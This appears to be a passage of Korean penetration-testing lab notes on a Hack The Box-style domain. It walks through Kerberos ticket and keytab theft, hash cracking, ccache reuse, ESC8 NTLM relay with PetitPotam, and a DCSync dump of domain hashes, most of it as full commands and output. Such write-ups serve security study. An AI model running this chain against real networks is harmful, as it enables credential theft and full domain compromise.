DI3MDU0NjMwWqcRGA8yMDI2MDkwMjE5NDYzMFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

이후 `klist` 를 확인하면 현재 로그온 세션에 `john` 의 TGT가 정상적으로 들어간 것을 확인할 수 있다:

```powershell
PS C:\tools> klist

Current LogonId is 0:0x14d304

Cached Tickets: (1)

#0>     Client: john @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 8/19/2026 14:45:43 (local)
        End Time:   8/20/2026 0:45:43 (local)
        Renew Time: 8/26/2026 14:45:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

이 상태에서 DC01의 SMB 리소스에 접근하면 필요 시 KDC로부터 CIFS Service Ticket을 발급받아 `john` 의 Kerberos 인증으로 접근하게 된다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks5.png)

그 결과 `john` 에게 허용된 SMB 리소스에 정상적으로 접근할 수 있었다.

WinRM 등 Kerberos 인증을 지원하는 원격 서비스에서도 동일한 티켓을 활용할 수 있지만, 실제 접속 가능 여부는 해당 사용자의 권한과 서비스 설정에 따라 달라진다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks6.png)

이처럼 평문 비밀번호를 알지 못하더라도 유효한 Kerberos 티켓과 충분한 권한이 있다면 도메인 내부에서 해당 사용자 컨텍스트로 원격 접근이 가능할 수 있다.

## Pass the Ticket (PtT) from Linux

Linux 호스트 역시 SSSD, Winbind 등을 통해 Active Directory에 가입되어 Kerberos 인증을 사용할 수 있다.

`realm list` 를 확인하면 현재 `linux01` 이 `INLANEFREIGHT.HTB` AD 도메인에 가입되어 있고, `david` 와 `julio` 가 허용된 로그인 계정으로 설정되어 있음을 확인할 수 있다:

```bash
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

`realm` 명령을 사용할 수 없는 환경이라도 SSSD 또는 Winbind 프로세스와 설정을 확인하여 AD 통합 여부를 추론할 수 있다:

```bash
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root         841       1  0 02:55 ?        00:00:00 /usr/sbin/sssd -i --logger=files
root        1026     841  0 02:55 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        1058     841  0 02:55 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        1059     841  0 02:55 ?        00:00:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
root        1330       1  0 03:00 ?        00:00:00 /usr/libexec/sssd/sssd_pac --logger=files --socket-activated
david@i+    9143    8372  0 05:21 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
```

위 출력에서는 SSSD가 `inlanefreight.htb` 도메인 백엔드로 동작하고 있으므로 해당 Linux 호스트가 AD 인증과 연동되어 있음을 확인할 수 있다.

### Keytab Files

Linux의 Kerberos 환경에서는 장기 키를 보관하는 Keytab과 이미 발급받은 티켓을 보관하는 Credential Cache(ccache)를 자주 확인하게 된다.

Keytab은 Principal의 장기 Kerberos 키를 파일 형태로 저장하며, 비밀번호를 직접 입력하지 않고 `kinit -k` 를 통해 TGT를 발급받는 데 사용할 수 있다.

우선 시스템에서 접근 가능한 Keytab 파일을 검색하였다:

```bash
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

   131610      4 -rw-------   1 root     root         2694 Aug 20 02:56 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262163      4 -rw-rw-rw-   1 root     root          216 Aug 20 05:20 /opt/specialfiles/carlos.keytab
```

`carlos.keytab` 은 권한이 `-rw-rw-rw-` 로 설정되어 있어 모든 사용자가 읽고 수정할 수 있는 위험한 상태이다.

Keytab을 인증에 사용하려면 파일의 키 데이터를 읽을 수 있으면 되므로 쓰기 권한은 필요하지 않다. 

오히려 일반 사용자에게 읽기 권한이 노출된 것 자체가 장기 키 유출로 이어질 수 있다.

`klist -k -t` 를 사용하면 Keytab에 저장된 Principal, KVNO, Timestamp 등의 엔트리를 확인할 수 있다:

```bash
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 08/20/2026 05:25:01 carlos@INLANEFREIGHT.HTB
   1 08/20/2026 05:25:01 carlos@INLANEFREIGHT.HTB
   1 08/20/2026 05:25:01 carlos@INLANEFREIGHT.HTB
```

`carlos@INLANEFREIGHT.HTB` 의 Keytab임을 확인했으므로 다음과 같이 `kinit -k -t` 로 해당 키를 이용해 TGT를 발급받을 수 있다:

```bash
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

### Extracting Keys from Keytabs

또한 `keytabextract.py` 와 같은 도구를 사용하면 Keytab에 저장된 Kerberos 키 재료를 추출할 수 있다:

```bash
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

여기서 RC4-HMAC 키는 AD 계정의 NT 해시와 동일한 값이므로 `hashcat -m 1000` 으로 오프라인 크랙을 시도할 수 있다:

```bash
$ hashcat -m 1000 'a738f92b3c08b424ec2d99589a9cce60' /usr/share/wordlists/rockyou.txt --show

a738f92b3c08b424ec2d99589a9cce60:Password5
```

RC4-HMAC/NT 해시가 약한 비밀번호에서 생성된 경우 위처럼 평문 비밀번호를 복구할 수 있으며, 해당 계정이 SSH 로그인을 허용한다면 확보한 비밀번호를 다른 인증 경로에도 검증할 수 있다.

### Discovering Keytabs in Scheduled Tasks

추가 Keytab을 찾기 위해 사용자의 예약 작업과 스크립트도 확인할 수 있다. 

`crontab` 을 살펴보면 다음 작업이 존재한다:

```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l

*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

`kerberos_script_test.sh` 가 5분마다 실행되도록 설정되어 있음을 확인할 수 있다.

스크립트 내용을 보면 `svc_workstations` Keytab으로 `kinit` 을 수행한 뒤, 발급된 Kerberos 티켓을 이용해 `smbclient` 로 DC01의 공유에 접근하는 흐름을 확인할 수 있다:

```bash
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

`.scripts` 디렉토리를 확인하면 `john` 과 `svc_workstations` 관련 Keytab 파일들이 추가로 존재한다:

```bash
carlos@inlanefreight.htb@linux01:~/.scripts$ ls -l

-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 146 Oct  6  2022 john.keytab
-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 251 Oct  6  2022 kerberos_script_test.sh
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 246 Aug 20 05:35 svc_workstations._all.kt
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  94 Aug 20 05:35 svc_workstations.kt
```

이 환경에서는 `svc_workstations._all.kt` 가 동일 Principal의 여러 Encryption Type 엔트리를 포함하는 Keytab으로 사용되고 있다.

따라서 해당 Keytab을 `keytabextract.py` 로 분석해 저장된 키 재료를 추출하였다:

```bash
carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py svc_workstations._all.kt

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        AES-128 HASH : 3a7e52143531408f39101187acc80677
```

추출된 RC4-HMAC/NT 해시를 크랙한 결과 `Password4` 라는 비밀번호를 확인할 수 있었다:

```bash
$ hashcat -m 1000 '7247e8d4387e76996ff3f18a34316fdd' /usr/share/wordlists/rockyou.txt --show

7247e8d4387e76996ff3f18a34316fdd:Password4
```

### Kerberos Credential Cache (ccache)

ccache는 `kinit` 등으로 이미 발급받은 Kerberos 티켓과 세션 키를 저장하는 Credential Cache이다.

Windows의 Kerberos 티켓 캐시에서 Rubeus로 티켓을 추출하는 것과 개념적으로 유사하지만, Keytab처럼 장기 키를 저장하는 파일과는 목적이 다르다.

Linux의 Kerberos Credential Cache는 설정에 따라 FILE, KEYRING, KCM 등의 형태를 사용할 수 있다. 

이 환경에서는 `/tmp` 에 `krb5cc_*` 형태의 FILE ccache가 저장되어 있었다.

`/tmp` 를 확인하면 `julio` 소유의 ccache 파일이 존재하는 것을 확인할 수 있다:

```bash
root@linux01:/tmp# ls -l

-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Aug 20 06:00 krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Aug 20 06:00 krb5cc_647401106_zCP4vJ
```

FILE 형식의 ccache는 파일을 읽을 수 있고 상위 디렉토리에 접근할 수 있다면 복사하거나 `KRB5CCNAME` 으로 지정해 사용할 수 있다.

`julio` 의 그룹 정보를 확인하면 `domain admins@inlanefreight.htb` 그룹에 포함되어 있어 도메인 관리자 계정임을 확인할 수 있다:

```bash
root@linux01:/tmp# id julio@INLANEFREIGHT.HTB

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

이후 `KRB5CCNAME` 환경 변수에 `julio` 의 ccache 경로를 지정하였다:

```bash
root@linux01:/tmp# export KRB5CCNAME=/tmp/krb5cc_647401106_zCP4vJ
```

`klist` 를 확인하면 현재 기본 Credential Cache가 `julio@INLANEFREIGHT.HTB` 의 티켓으로 전환된 것을 확인할 수 있다:

```bash
root@linux01:/tmp# klist

Ticket cache: FILE:/tmp/krb5cc_647401106_zCP4vJ
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
08/20/2026 05:59:37  08/20/2026 15:59:37  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 08/21/2026 05:59:37
```

이 ccache를 사용해 DC01의 `C$` 공유에 접근하면 `julio` 의 Kerberos 권한으로 정상적으로 파일 목록을 확인할 수 있다:

```bash
root@linux01:/tmp# smbclient //DC01/C$ -k -c ls -no-pass

  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Fri Aug 20 02:54:42 2026
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Mon Oct 10 10:48:55 2022
```

### Reusing a ccache from Another Host

또한 ccache 파일을 Kali와 같은 다른 Linux 호스트로 복사한 뒤 `KRB5CCNAME` 으로 지정하여 재사용할 수 있다.

로컬 터미널에서 가져온 ccache 파일을 다음과 같이 지정하였다:

```bash
$ export KRB5CCNAME=$(pwd)/krb5cc_647401106_6O1tms
```

`klist` 를 확인하면 Kali에서도 `julio@INLANEFREIGHT.HTB` 의 TGT가 정상적으로 로드된 것을 확인할 수 있다:

```bash
$ klist                                                           
Ticket cache: FILE:/home/kali/krb5cc_647401106_6O1tms
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
08/20/2026 04:04:37  08/20/2026 14:04:37  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 08/21/2026 04:04:37
```

Kerberos는 SPN과 호스트 이름이 중요하므로 대상 FQDN이 올바르게 해석되도록 `/etc/hosts` 또는 DNS를 구성한 뒤 NXC에서 ccache를 사용할 수 있다:

```bash
$ proxychains nxc smb dc01.INLANEFREIGHT.HTB --use-kcache

SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [+] INLANEFREIGHT.HTB\julio from ccache (Pwn3d!)
```

`julio` 가 Domain Admins에 속하므로 WinRM을 통한 원격 접속도 시도하였다:

```bash
$ proxychains evil-winrm -i dc01.inlanefreight.htb -r INLANEFREIGHT.HTB
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information                                                
Cannot find KDC for realm "INLANEFREIGHT.HTB"                                                                                                                                                                                                               
Error: Exiting with code 1
```

### Configuring Kerberos KDC Discovery

하지만 처음에는 다음과 같이 KDC를 찾지 못하는 오류가 발생하였다.

이는 현재 Kerberos 클라이언트가 `INLANEFREIGHT.HTB` Realm에 사용할 KDC를 DNS나 로컬 설정을 통해 발견하지 못했기 때문이다.

따라서 krb5.conf에 Realm과 KDC 매핑을 명시하면 Kerberos 클라이언트가 사용할 KDC를 찾을 수 있다. 

NXC의 `--generate-krb5-file` 옵션으로 현재 환경에 맞는 설정 파일을 생성하였다:

```bash
$ proxychains nxc smb dc01.INLANEFREIGHT.HTB --use-kcache --generate-krb5-file krb5.conf 

SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [+] INLANEFREIGHT.HTB\julio from ccache (Pwn3d!)
```

생성된 `krb5.conf` 의 내용은 다음과 같다:

```conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.INLANEFREIGHT.HTB
        admin_server = dc01.INLANEFREIGHT.HTB
        default_domain = INLANEFREIGHT.HTB
    }

[domain_realm]
    .INLANEFREIGHT.HTB = INLANEFREIGHT.HTB
    INLANEFREIGHT.HTB = INLANEFREIGHT.HTB
```

`KRB5_CONFIG` 환경 변수로 해당 파일을 사용하도록 지정하였다:

```bash
$ export KRB5_CONFIG=$(pwd)/krb5.conf
```

이후 다시 Evil-WinRM에서 Kerberos 인증을 시도하면 정상적으로 `julio` 세션으로 접속할 수 있었다:

```bash
$ proxychains evil-winrm -i dc01.inlanefreight.htb -r INLANEFREIGHT.HTB                 

*Evil-WinRM* PS C:\Users\julio\Documents>
```

## Pass the Certificate (ESC8)

### AD CS Web Enrollment and Template Enumeration

AD CS(Active Directory Certificate Services) 환경에서는 인증서 기반 인증을 악용한 공격 경로도 존재한다. 

ESC8은 인증서 템플릿 하나의 취약점이라기보다, NTLM Relay가 가능한 AD CS HTTP Web Enrollment 엔드포인트를 악용하는 기법이다.

CA01의 웹 서버를 확인하면 `/CertSrv/` Web Enrollment 페이지가 노출되어 있음을 확인할 수 있다:

![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks7.png)

이 페이지는 AD CS Web Enrollment를 통해 인증서 요청을 제출하고 발급 상태를 확인할 수 있는 엔드포인트이다.

먼저 Certipy로 활성화된 인증서 템플릿과 권한을 열거하였다:

```bash
─$ certipy-ad find -u 'wwhite@INLANEFREIGHT.LOCAL' -p 'package5shores_topher1' -dc-ip 10.129.234.174 -enabled -stdout

  3
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : inlanefreight-CA01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-04-28T17:11:06+00:00
    Template Last Modified              : 2025-04-28T17:11:06+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : INLANEFREIGHT.LOCAL\Enterprise Read-only Domain Controllers
                                          INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Controllers
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
        Full Control Principals         : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
        Write Property Enroll           : INLANEFREIGHT.LOCAL\Domain Admins
                                          INLANEFREIGHT.LOCAL\Domain Controllers
                                          INLANEFREIGHT.LOCAL\Enterprise Admins
                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
        Write Property AutoEnroll       : INLANEFREIGHT.LOCAL\Domain Controllers
                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
```

### Understanding the KerberosAuthentication Template

출력에서 이번 공격 흐름과 관련된 `KerberosAuthentication` 템플릿의 주요 속성을 정리하면 다음과 같다:

```text
Certificate Authorities       : inlanefreight-CA01-CA
Enabled                       : True
Client Authentication         : True

Extended Key Usage
  Client Authentication
  Server Authentication
  Smart Card Logon
  KDC Authentication

Enrollment Rights
  Domain Controllers
  Domain Admins
  Enterprise Admins
  Enterprise Domain Controllers
  Enterprise Read-only Domain Controllers

Requires Manager Approval     : False
Authorized Signatures Required: 0

Enrollee Supplies Subject     : False

Certificate Name Flag
  SubjectAltRequireDomainDns
  SubjectAltRequireDns
```

`Certificate Authorities` 항목은 이 템플릿을 발급할 수 있는 발급 **CA(Issuing CA)** 를 나타낸다:

```text
Certificate Authorities       : inlanefreight-CA01-CA
```

`Client Authentication: True` 와 관련 EKU를 통해 이 템플릿으로 발급된 인증서를 클라이언트 인증에 사용할 수 있음을 확인할 수 있다:

```text
Client Authentication         : True
```

`Extended Key Usage` 는 해당 인증서를 어떤 인증 용도로 사용할 수 있는지 나타낸다:

```text
Extended Key Usage
  Client Authentication
  Server Authentication
  Smart Card Logon
  KDC Authentication
```

즉, 이 템플릿은 Client Authentication, Server Authentication, Smart Card Logon, KDC Authentication 등의 용도를 허용한다.

또한 `Enrollment Rights` 에 `Domain Controllers` 가 포함되어 있으므로 DC01$과 같은 도메인 컨트롤러 컴퓨터 계정은 정상적으로 이 템플릿을 이용해 인증서를 등록할 권한이 있다.

> 핵심은 CA01이 임의로 DC01의 인증서를 가져오는 것이 아니다. 공격자가 DC01$의 NTLM 인증을 AD CS Web Enrollment로 릴레이하면, Web Enrollment는 그 인증을 DC01$의 요청으로 받아들이고 Enrollment Rights가 허용하는 템플릿으로 인증서를 발급하게 된다.

또한 `Enrollee Supplies Subject: False` 이므로 요청자가 임의의 Subject를 지정하는 방식은 허용되지 않는다:

```text
Enrollee Supplies Subject     : False
```

`SubjectAltRequireDomainDns` 와 `SubjectAltRequireDns` 는 도메인/컴퓨터 객체의 DNS 정보를 인증서 SAN에 포함하도록 하는 플래그이다:

```text
Certificate Name Flag
  SubjectAltRequireDomainDns
  SubjectAltRequireDns
```

따라서 이 시나리오의 핵심은 **DC01$이 등록 가능한 인증 템플릿**과 **NTLM Relay가 가능한 AD CS Web Enrollment 엔드포인트**가 함께 존재한다는 점이다.

이 조건에서 DC01의 NTLM 인증을 공격자에게 강제로 발생시킨 뒤 CA Web Enrollment로 릴레이하면 DC01$의 인증서를 발급받는 ESC8 공격 흐름을 구성할 수 있다.

### NTLM Relay to AD CS

먼저 `ntlmrelayx` 를 AD CS Web Enrollment의 `certfnsh.asp` 엔드포인트에 연결하고, 릴레이된 인증으로 `KerberosAuthentication` 템플릿을 요청하도록 설정하였다:

```bash
$ impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

이 상태에서 `ntlmrelayx` 는 공격자 호스트에서 들어오는 NTLM 인증을 기다리며, 인증을 수신하면 CA01의 Web Enrollment 엔드포인트로 전달한다.

이후 PetitPotam을 사용해 DC01이 공격자 호스트로 NTLM 인증을 시도하도록 강제하였다:

```bash
$ python3 PetitPotam.py -u wwhite -p 'package5shores_topher1' -d INLANEFREIGHT.LOCAL 10.10.14.49 10.129.234.174

[-] Connecting to ncacn_np:10.129.234.174[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected
```

성공하면 DC01$의 SMB NTLM 인증이 공격자에게 들어오고, `ntlmrelayx` 가 이를 CA Web Enrollment로 릴레이하여 DC01$의 컨텍스트로 CSR을 제출한다. 

그 결과 다음과 같이 `DC01.pfx` 인증서가 발급된다:

```text
[*] (SMB): Received connection from 10.129.234.174, attacking target http://10.129.234.172
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from INLANEFREIGHT/DC01$@10.129.234.174 against http://10.129.234.172 SUCCEED [1]
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Generating CSR...
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> CSR generated!
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Getting certificate...
[*] (SMB): Received connection from 10.129.234.174, attacking target http://10.129.234.172
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from INLANEFREIGHT/DC01$@10.129.234.174 against http://10.129.234.172 SUCCEED [2]
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [2] -> Skipping user DC01$ since attack was already performed
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> GOT CERTIFICATE! ID 30
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Certificate successfully written to file
```

### Authenticating with the Issued Certificate

발급된 `DC01.pfx` 는 DC01$의 인증서이므로 Certipy를 이용해 해당 컴퓨터 계정으로 인증할 수 있다.

Certipy는 인증서를 이용한 PKINIT으로 TGT를 요청하고, 환경이 지원하면 이후 UnPAC-the-Hash 흐름을 통해 해당 계정의 NT 해시도 추출할 수 있다:

```bash
$ certipy-ad auth -pfx DC01.pfx -dc-ip 10.129.234.174 -username 'DC01$' -domain INLANEFREIGHT.LOCAL

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.inlanefreight.local'
[*]     SAN DNS Host Name: 'inlanefreight.local'
[*]     SAN DNS Host Name: 'INLANEFREIGHT'
[*] Found multiple identities in certificate
[*] Using identity: DNS Host Name: DC01.inlanefreight.local
[*] Using principal: 'dc01$@inlanefreight.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@inlanefreight.local': aad3b435b51404eeaad3b435b51404ee:f31f567981e5619d88a672bf65271898
```

이처럼 DC01$의 NT 해시를 확보하였다. 

도메인 컨트롤러 컴퓨터 계정은 디렉터리 복제를 수행하기 위한 권한을 가지므로, 해당 자격 증명으로 DCSync를 수행해 도메인 자격 증명을 복제할 수 있다:

```bash
$ impacket-secretsdump -hashes ':f31f567981e5619d88a672bf65271898' 'INLANEFREIGHT.LOCAL/DC01$'@10.129.234.174

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9cdc3e8cac76731c8827c85d9c256d06:::
inlanefreight.local\jpinkman:1106:aad3b435b51404eeaad3b435b51404ee:9d995e5865f9dbfc701210466f0c78fe:::
inlanefreight.local\wwhite:1107:aad3b435b51404eeaad3b435b51404ee:e831eef580eb72076cc36c43ee57bb95:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f31f567981e5619d88a672bf65271898:::
CA01$:1105:aad3b435b51404eeaad3b435b51404ee:4ef00b24e86de4a28ffdfc481797179b:::

# SKIP
```